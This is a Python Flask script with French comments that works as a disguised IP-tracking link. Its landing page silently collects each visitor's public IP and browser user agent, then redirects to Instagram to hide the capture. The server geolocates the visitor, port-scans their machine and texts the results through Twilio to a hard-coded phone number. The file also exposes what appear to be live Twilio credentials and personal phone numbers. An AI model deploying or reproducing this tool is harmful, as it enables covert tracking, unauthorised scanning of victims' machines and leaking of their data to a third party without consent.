import socket
import subprocess
import os
import requests
from flask import Flask, request, jsonify
from twilio.rest import Client

app = Flask(__name__)

# Configuration Twilio
account_sid = os.getenv('AC2ef2bd5bd5146f76f586d2c577159f90') or 'AC2ef2bd5bd5146f76f586d2c577159f90'  # Remplace avec ton SID Twilio
auth_token = os.getenv('ab95f4ee6a016c23b123670550a6cde7') or 'ab95f4ee6a016c23b123670550a6cde7'  # Remplace avec ton Token Twilio
from_number = os.getenv('+12524866318') or '+12524866318'  # Remplace avec ton numéro Twilio                                                               
to_number = os.getenv('+33635960569') or '+33635960569'  # Remplace avec ton numéro de destination

client = Client(account_sid, auth_token)

# Fonction pour obtenir la géolocalisation basée sur l'IP
def get_geolocation(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return f"{res['city']}, {res['regionName']}, {res['country']} (ISP: {res['isp']})"
    except:
        return "Localisation impossible"

# Fonction pour scanner les ports ouverts
def scan_ports(ip, ports=[22, 80, 443, 8080]):
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket()
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            continue
    return open_ports

# Fonction pour envoyer le SMS via Twilio
def send_sms(ip, user_agent):
    location = get_geolocation(ip)
    ports = scan_ports(ip)
    message_body = (
        f"[IP TRACKER]\n"
        f"IP publique : {ip}\n"
        f"Localisation : {location}\n"
        f"Ports ouverts : {ports if ports else 'Aucun trouvé'}\n"
        f"User-Agent : {user_agent}"
    )
    try:
        message = client.messages.create(
            body=message_body,
            from_=from_number,
            to=to_number
        )
        print(f"[+] SMS envoyé : {message.sid}")
    except Exception as e:
        print(f"[!] Erreur envoi SMS : {e}")

# Route d'accueil qui redirige et collecte les informations
@app.route('/')
def index():
    return '''
    <html>
    <head><title>Redirection</title></head>
    <body>
        <script>
            fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                fetch("/log", {
                    method: "POST",
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        ip: data.ip,
                        ua: navigator.userAgent
                    })
                }).then(() => {
                    window.location.href = "https://www.instagram.com";
                });
            });
        </script>
    </body>
    </html>
    '''

# Route pour récupérer et traiter les données de l'IP
@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    ip = data.get('ip')
    user_agent = data.get('ua')
    print(f"[+] IP reçue : {ip}")
    send_sms(ip, user_agent)
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
